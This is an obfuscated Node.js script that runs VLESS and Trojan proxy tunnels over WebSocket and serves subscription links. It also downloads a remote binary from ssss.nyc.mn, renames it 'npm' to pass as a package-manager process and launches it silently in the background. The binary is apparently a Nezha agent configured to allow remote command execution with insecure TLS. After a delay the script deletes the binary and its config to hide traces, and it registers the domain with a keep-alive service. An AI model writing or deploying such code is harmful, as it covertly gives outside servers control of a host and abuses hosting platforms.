const _0x2e7d09=_0x5784;(function(_0x3adb35,_0x84fdf6){const _0x468ed0=_0x5784,_0x2e1e73=_0x3adb35();while(!![]){try{const _0x399dda=parseInt(_0x468ed0(0x1d4))/0x1+parseInt(_0x468ed0(0x1ff))/0x2+parseInt(_0x468ed0(0x201))/0x3+parseInt(_0x468ed0(0x1f1))/0x4*(-parseInt(_0x468ed0(0x1fb))/0x5)+parseInt(_0x468ed0(0x213))/0x6+parseInt(_0x468ed0(0x220))/0x7+-parseInt(_0x468ed0(0x1ee))/0x8;if(_0x399dda===_0x84fdf6)break;else _0x2e1e73['push'](_0x2e1e73['shift']());}catch(_0x88b79e){_0x2e1e73['push'](_0x2e1e73['shift']());}}}(_0x446b,0x822c5));const os=require('os'),http=require(_0x2e7d09(0x1e5)),fs=require('fs'),axios=require(_0x2e7d09(0x1e1)),net=require(_0x2e7d09(0x210)),path=require(_0x2e7d09(0x20b)),crypto=require(_0x2e7d09(0x1fa)),{Buffer}=require(_0x2e7d09(0x1f9)),{exec,execSync}=require(_0x2e7d09(0x203)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2e7d09(0x211)][_0x2e7d09(0x1ca)]||'5efabea4-f6d4-91fd-b8f0-17e004c89c60',NEZHA_SERVER=process['env'][_0x2e7d09(0x1c4)]||'',NEZHA_PORT=process[_0x2e7d09(0x211)][_0x2e7d09(0x217)]||'',NEZHA_KEY=process[_0x2e7d09(0x211)][_0x2e7d09(0x214)]||'',DOMAIN=process['env']['DOMAIN']||_0x2e7d09(0x1c6),AUTO_ACCESS=process[_0x2e7d09(0x211)][_0x2e7d09(0x1e9)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x2e7d09(0x1cb)](0x0,0x8),SUB_PATH=process[_0x2e7d09(0x211)][_0x2e7d09(0x1f2)]||_0x2e7d09(0x21d),NAME=process[_0x2e7d09(0x211)][_0x2e7d09(0x1d6)]||_0x2e7d09(0x1e7),PORT=process[_0x2e7d09(0x211)][_0x2e7d09(0x22d)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5e20a7=_0x2e7d09;try{const _0x56f291=await axios['get']('https://speed.cloudflare.com/meta'),_0x4ad947=_0x56f291[_0x5e20a7(0x1eb)];ISP=(_0x4ad947[_0x5e20a7(0x1f7)]+'-'+_0x4ad947['asOrganization'])[_0x5e20a7(0x1c8)](/ /g,'_');}catch(_0x39eff7){ISP=_0x5e20a7(0x20d);}};GetISP();const httpServer=http[_0x2e7d09(0x22f)]((_0x31bc1f,_0x3266bc)=>{const _0x1bb807=_0x2e7d09;if(_0x31bc1f[_0x1bb807(0x235)]==='/'){const _0x5811fb=path[_0x1bb807(0x1dc)](__dirname,'index.html');fs[_0x1bb807(0x1e2)](_0x5811fb,'utf8',(_0x5da1ff,_0x5ab83e)=>{const _0x4a57e5=_0x1bb807;if(_0x5da1ff){_0x3266bc['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x3266bc[_0x4a57e5(0x204)](_0x4a57e5(0x20c));return;}_0x3266bc[_0x4a57e5(0x1f0)](0xc8,{'Content-Type':_0x4a57e5(0x22e)}),_0x3266bc[_0x4a57e5(0x204)](_0x5ab83e);});return;}else{if(_0x31bc1f[_0x1bb807(0x235)]==='/'+SUB_PATH){const _0x469fe9=_0x1bb807(0x237)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x7d209f='trojan://'+UUID+'@'+DOMAIN+_0x1bb807(0x206)+DOMAIN+_0x1bb807(0x1fe)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x56f454=_0x469fe9+'\x0a'+_0x7d209f,_0x82990e=Buffer[_0x1bb807(0x239)](_0x56f454)[_0x1bb807(0x202)](_0x1bb807(0x212));_0x3266bc[_0x1bb807(0x1f0)](0xc8,{'Content-Type':'text/plain'}),_0x3266bc[_0x1bb807(0x204)](_0x82990e+'\x0a');}else _0x3266bc[_0x1bb807(0x1f0)](0x194,{'Content-Type':_0x1bb807(0x1ec)}),_0x3266bc['end'](_0x1bb807(0x218));}}),wss=new WebSocket[(_0x2e7d09(0x22a))]({'server':httpServer}),uuid=UUID[_0x2e7d09(0x1c8)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2e7d09(0x1cf)];function resolveHost(_0x4333a2){return new Promise((_0x5bebb7,_0x2adcb4)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x4333a2)){_0x5bebb7(_0x4333a2);return;}let _0x160c85=0x0;function _0x54fd8e(){const _0x3a36b7=_0x5784;if(_0x160c85>=DNS_SERVERS['length']){_0x2adcb4(new Error(_0x3a36b7(0x1e4)+_0x4333a2+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x7c1a84=DNS_SERVERS[_0x160c85];_0x160c85++;const _0x9df65='https://dns.google/resolve?name='+encodeURIComponent(_0x4333a2)+_0x3a36b7(0x1f6);axios[_0x3a36b7(0x224)](_0x9df65,{'timeout':0x1388,'headers':{'Accept':_0x3a36b7(0x1c3)}})[_0x3a36b7(0x234)](_0x40041b=>{const _0x951021=_0x3a36b7,_0x22ec7a=_0x40041b[_0x951021(0x1eb)];if(_0x22ec7a['Status']===0x0&&_0x22ec7a[_0x951021(0x1e6)]&&_0x22ec7a[_0x951021(0x1e6)][_0x951021(0x1da)]>0x0){const _0x57b0da=_0x22ec7a['Answer'][_0x951021(0x22b)](_0x42bc6a=>_0x42bc6a[_0x951021(0x1c5)]===0x1);if(_0x57b0da){_0x5bebb7(_0x57b0da[_0x951021(0x1eb)]);return;}}_0x54fd8e();})[_0x3a36b7(0x229)](_0x419c17=>{_0x54fd8e();});}_0x54fd8e();});}function handleVlessConnection(_0xa322d2,_0x175bbe){const _0x2a5c50=_0x2e7d09,[_0x541ac3]=_0x175bbe,_0x22632f=_0x175bbe['slice'](0x1,0x11);if(!_0x22632f[_0x2a5c50(0x1d8)]((_0x3c4300,_0x545805)=>_0x3c4300==parseInt(uuid['substr'](_0x545805*0x2,0x2),0x10)))return![];let _0x4a1b49=_0x175bbe[_0x2a5c50(0x1cb)](0x11,0x12)[_0x2a5c50(0x21c)]()+0x13;const _0x3fd416=_0x175bbe[_0x2a5c50(0x1cb)](_0x4a1b49,_0x4a1b49+=0x2)['readUInt16BE'](0x0),_0x10985f=_0x175bbe[_0x2a5c50(0x1cb)](_0x4a1b49,_0x4a1b49+=0x1)[_0x2a5c50(0x21c)](),_0x3fa091=_0x10985f==0x1?_0x175bbe['slice'](_0x4a1b49,_0x4a1b49+=0x4)['join']('.'):_0x10985f==0x2?new TextDecoder()['decode'](_0x175bbe['slice'](_0x4a1b49+0x1,_0x4a1b49+=0x1+_0x175bbe[_0x2a5c50(0x1cb)](_0x4a1b49,_0x4a1b49+0x1)[_0x2a5c50(0x21c)]())):_0x10985f==0x3?_0x175bbe[_0x2a5c50(0x1cb)](_0x4a1b49,_0x4a1b49+=0x10)[_0x2a5c50(0x1e3)]((_0x55baad,_0x12fb6f,_0x1fa9ed,_0x57755e)=>_0x1fa9ed%0x2?_0x55baad[_0x2a5c50(0x20a)](_0x57755e[_0x2a5c50(0x1cb)](_0x1fa9ed-0x1,_0x1fa9ed+0x1)):_0x55baad,[])[_0x2a5c50(0x232)](_0x44d89c=>_0x44d89c[_0x2a5c50(0x1db)](0x0)['toString'](0x10))['join'](':'):'';_0xa322d2[_0x2a5c50(0x1d0)](new Uint8Array([_0x541ac3,0x0]));const _0x2300ca=createWebSocketStream(_0xa322d2);return resolveHost(_0x3fa091)[_0x2a5c50(0x234)](_0x30f591=>{const _0x198bf0=_0x2a5c50;net[_0x198bf0(0x238)]({'host':_0x30f591,'port':_0x3fd416},function(){const _0x217a99=_0x198bf0;this[_0x217a99(0x1f4)](_0x175bbe['slice'](_0x4a1b49)),_0x2300ca['on'](_0x217a99(0x1f8),()=>{})[_0x217a99(0x1e0)](this)['on'](_0x217a99(0x1f8),()=>{})[_0x217a99(0x1e0)](_0x2300ca);})['on'](_0x198bf0(0x1f8),()=>{});})[_0x2a5c50(0x229)](_0x23da9e=>{const _0x951649=_0x2a5c50;net[_0x951649(0x238)]({'host':_0x3fa091,'port':_0x3fd416},function(){const _0x28902c=_0x951649;this[_0x28902c(0x1f4)](_0x175bbe[_0x28902c(0x1cb)](_0x4a1b49)),_0x2300ca['on']('error',()=>{})[_0x28902c(0x1e0)](this)['on'](_0x28902c(0x1f8),()=>{})['pipe'](_0x2300ca);})['on']('error',()=>{});}),!![];}function _0x446b(){const _0x40fabc=['listen','AUTO_ACCESS','2087','data','text/plain','npm\x20is\x20already\x20running,\x20skip\x20running...','4901912KTiDaX','aarch64','writeHead','2013372SlNaNQ','SUB_PATH','npm\x20is\x20running','write','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&type=A','country','error','buffer','crypto','10wHhcJT','https://amd64.ssss.nyc.mn/v1','443','&fp=chrome&type=ws&host=','323490RHdhfY','client_secret:\x20','1924989FYmuMR','toString','child_process','end','once',':443?security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','close','update','concat','path','Hello\x20world!','Unknown','unlink','arm','net','env','base64','2019612PrRRFj','NEZHA_KEY','writeFileSync','\x20-p\x20','NEZHA_PORT','Not\x20Found\x0a','Automatic\x20Access\x20Task\x20added\x20successfully','https://','pop','readUInt8','sub','log','message','2125781qRAQEo','true','2083','includes','get','config.yaml','https://arm64.ssss.nyc.mn/agent','trim','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','catch','Server','find','chmod\x20+x\x20npm','PORT','text/html','createServer','https://amd64.ssss.nyc.mn/agent','arm64','map','https://oooo.serv00.net/add-url','then','url','/bin/bash','vless://','connect','from','application/dns-json','NEZHA_SERVER','type','1234.abc.com','npm\x20download\x20successfully','replace','2053','UUID','slice','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','--tls','split','1.1.1.1','send','false','npm\x20running\x20error:','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','708921EHCpjs','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NAME','https://arm64.ssss.nyc.mn/v1','every','8443','length','readUInt16BE','join','createWriteStream','application/json','npm','pipe','axios','readFile','reduce','Failed\x20to\x20resolve\x20','http','Answer','Hug'];_0x446b=function(){return _0x40fabc;};return _0x446b();}function _0x5784(_0x2f83a2,_0x260c5d){const _0x446b90=_0x446b();return _0x5784=function(_0x57841c,_0x18c0cb){_0x57841c=_0x57841c-0x1c3;let _0x38e95a=_0x446b90[_0x57841c];return _0x38e95a;},_0x5784(_0x2f83a2,_0x260c5d);}function handleTrojanConnection(_0x3710d6,_0x437f9f){const _0x10ff1e=_0x2e7d09;try{if(_0x437f9f[_0x10ff1e(0x1da)]<0x3a)return![];const _0x3f1d51=_0x437f9f[_0x10ff1e(0x1cb)](0x0,0x38)[_0x10ff1e(0x202)](),_0x40ffef=[UUID];let _0x439429=null;for(const _0x3049e3 of _0x40ffef){const _0x1c494a=crypto['createHash']('sha224')[_0x10ff1e(0x209)](_0x3049e3)['digest']('hex');if(_0x1c494a===_0x3f1d51){_0x439429=_0x3049e3;break;}}if(!_0x439429)return![];let _0x360254=0x38;_0x437f9f[_0x360254]===0xd&&_0x437f9f[_0x360254+0x1]===0xa&&(_0x360254+=0x2);const _0x32171f=_0x437f9f[_0x360254];if(_0x32171f!==0x1)return![];_0x360254+=0x1;const _0x9f3611=_0x437f9f[_0x360254];_0x360254+=0x1;let _0x3376c4,_0x1a672f;if(_0x9f3611===0x1)_0x3376c4=_0x437f9f['slice'](_0x360254,_0x360254+0x4)[_0x10ff1e(0x1dc)]('.'),_0x360254+=0x4;else{if(_0x9f3611===0x3){const _0x54a012=_0x437f9f[_0x360254];_0x360254+=0x1,_0x3376c4=_0x437f9f[_0x10ff1e(0x1cb)](_0x360254,_0x360254+_0x54a012)['toString'](),_0x360254+=_0x54a012;}else{if(_0x9f3611===0x4)_0x3376c4=_0x437f9f[_0x10ff1e(0x1cb)](_0x360254,_0x360254+0x10)[_0x10ff1e(0x1e3)]((_0x3fbd73,_0x759be7,_0x33ee3d,_0x3bda85)=>_0x33ee3d%0x2?_0x3fbd73['concat'](_0x3bda85[_0x10ff1e(0x1cb)](_0x33ee3d-0x1,_0x33ee3d+0x1)):_0x3fbd73,[])['map'](_0x2c3140=>_0x2c3140[_0x10ff1e(0x1db)](0x0)[_0x10ff1e(0x202)](0x10))[_0x10ff1e(0x1dc)](':'),_0x360254+=0x10;else return![];}}_0x1a672f=_0x437f9f[_0x10ff1e(0x1db)](_0x360254),_0x360254+=0x2;_0x360254<_0x437f9f[_0x10ff1e(0x1da)]&&_0x437f9f[_0x360254]===0xd&&_0x437f9f[_0x360254+0x1]===0xa&&(_0x360254+=0x2);const _0x337c88=createWebSocketStream(_0x3710d6);return resolveHost(_0x3376c4)[_0x10ff1e(0x234)](_0x10f3f5=>{const _0x25f30c=_0x10ff1e;net[_0x25f30c(0x238)]({'host':_0x10f3f5,'port':_0x1a672f},function(){const _0x2b6422=_0x25f30c;_0x360254<_0x437f9f[_0x2b6422(0x1da)]&&this['write'](_0x437f9f[_0x2b6422(0x1cb)](_0x360254)),_0x337c88['on']('error',()=>{})[_0x2b6422(0x1e0)](this)['on'](_0x2b6422(0x1f8),()=>{})[_0x2b6422(0x1e0)](_0x337c88);})['on'](_0x25f30c(0x1f8),()=>{});})[_0x10ff1e(0x229)](_0x12793d=>{const _0x1c1bd4=_0x10ff1e;net['connect']({'host':_0x3376c4,'port':_0x1a672f},function(){const _0x173f95=_0x5784;_0x360254<_0x437f9f[_0x173f95(0x1da)]&&this[_0x173f95(0x1f4)](_0x437f9f[_0x173f95(0x1cb)](_0x360254)),_0x337c88['on'](_0x173f95(0x1f8),()=>{})['pipe'](this)['on'](_0x173f95(0x1f8),()=>{})[_0x173f95(0x1e0)](_0x337c88);})['on'](_0x1c1bd4(0x1f8),()=>{});}),!![];}catch(_0x517e1b){return![];}}wss['on']('connection',(_0x561d8c,_0x20d210)=>{const _0x248ef7=_0x2e7d09,_0x995314=_0x20d210['url']||'';_0x561d8c[_0x248ef7(0x205)](_0x248ef7(0x21f),_0x2dd33d=>{const _0x401b70=_0x248ef7;if(_0x2dd33d[_0x401b70(0x1da)]>0x11&&_0x2dd33d[0x0]===0x0){const _0x21c89d=_0x2dd33d[_0x401b70(0x1cb)](0x1,0x11),_0x1a926b=_0x21c89d[_0x401b70(0x1d8)]((_0x28585f,_0x54dc46)=>_0x28585f==parseInt(uuid['substr'](_0x54dc46*0x2,0x2),0x10));if(_0x1a926b){!handleVlessConnection(_0x561d8c,_0x2dd33d)&&_0x561d8c[_0x401b70(0x208)]();return;}}!handleTrojanConnection(_0x561d8c,_0x2dd33d)&&_0x561d8c[_0x401b70(0x208)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x35882f=_0x2e7d09,_0x15a86d=os['arch']();return _0x15a86d===_0x35882f(0x20f)||_0x15a86d===_0x35882f(0x231)||_0x15a86d===_0x35882f(0x1ef)?!NEZHA_PORT?_0x35882f(0x1d7):_0x35882f(0x226):!NEZHA_PORT?_0x35882f(0x1fc):_0x35882f(0x230);},downloadFile=async()=>{const _0x1afd91=_0x2e7d09;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5a0b87=getDownloadUrl(),_0x55621b=await axios({'method':'get','url':_0x5a0b87,'responseType':'stream'}),_0x3ebe63=fs[_0x1afd91(0x1dd)](_0x1afd91(0x1df));return _0x55621b[_0x1afd91(0x1eb)][_0x1afd91(0x1e0)](_0x3ebe63),new Promise((_0x5b22d2,_0x2c963e)=>{const _0x150026=_0x1afd91;_0x3ebe63['on']('finish',()=>{const _0x563e7a=_0x5784;console['log'](_0x563e7a(0x1c7)),exec(_0x563e7a(0x22c),_0x5a62ac=>{if(_0x5a62ac)_0x2c963e(_0x5a62ac);_0x5b22d2();});}),_0x3ebe63['on'](_0x150026(0x1f8),_0x2c963e);});}catch(_0x19b61c){throw _0x19b61c;}},runnz=async()=>{const _0x210e07=_0x2e7d09;try{const _0x17241b=execSync(_0x210e07(0x1cc),{'encoding':'utf-8'});if(_0x17241b[_0x210e07(0x227)]()!==''){console['log'](_0x210e07(0x1ed));return;}}catch(_0x2251e7){}await downloadFile();let _0x549544='',_0x24c58a=[_0x210e07(0x1fd),_0x210e07(0x1d9),'2096',_0x210e07(0x1ea),_0x210e07(0x222),_0x210e07(0x1c9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2727b1=_0x24c58a[_0x210e07(0x223)](NEZHA_PORT)?_0x210e07(0x1cd):'';_0x549544='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x210e07(0x216)+NEZHA_KEY+'\x20'+_0x2727b1+_0x210e07(0x228);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5787b2=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x210e07(0x1ce)](':')[_0x210e07(0x21b)]():'',_0xc04482=_0x24c58a[_0x210e07(0x223)](_0x5787b2)?_0x210e07(0x221):_0x210e07(0x1d1),_0x771341=_0x210e07(0x200)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xc04482+_0x210e07(0x1f5)+UUID;fs[_0x210e07(0x215)](_0x210e07(0x225),_0x771341);}_0x549544=_0x210e07(0x1d3);}else{console['log'](_0x210e07(0x1d5));return;}}try{exec(_0x549544,{'shell':_0x210e07(0x236)},_0x5dec71=>{const _0x1a55fa=_0x210e07;if(_0x5dec71)console['error'](_0x1a55fa(0x1d2),_0x5dec71);else console[_0x1a55fa(0x21e)](_0x1a55fa(0x1f3));});}catch(_0x231187){console[_0x210e07(0x1f8)]('error:\x20'+_0x231187);}};async function addAccessTask(){const _0x53b032=_0x2e7d09;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x97db2=_0x53b032(0x21a)+DOMAIN;try{const _0x1bd321=await axios['post'](_0x53b032(0x233),{'url':_0x97db2},{'headers':{'Content-Type':_0x53b032(0x1de)}});console[_0x53b032(0x21e)](_0x53b032(0x219));}catch(_0xd2d47b){}}const delFiles=()=>{const _0x538fb3=_0x2e7d09;fs[_0x538fb3(0x20e)]('npm',()=>{}),fs[_0x538fb3(0x20e)]('config.yaml',()=>{});};httpServer[_0x2e7d09(0x1e8)](PORT,()=>{const _0x4b6006=_0x2e7d09;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4b6006(0x21e)](_0x4b6006(0x207)+PORT);});
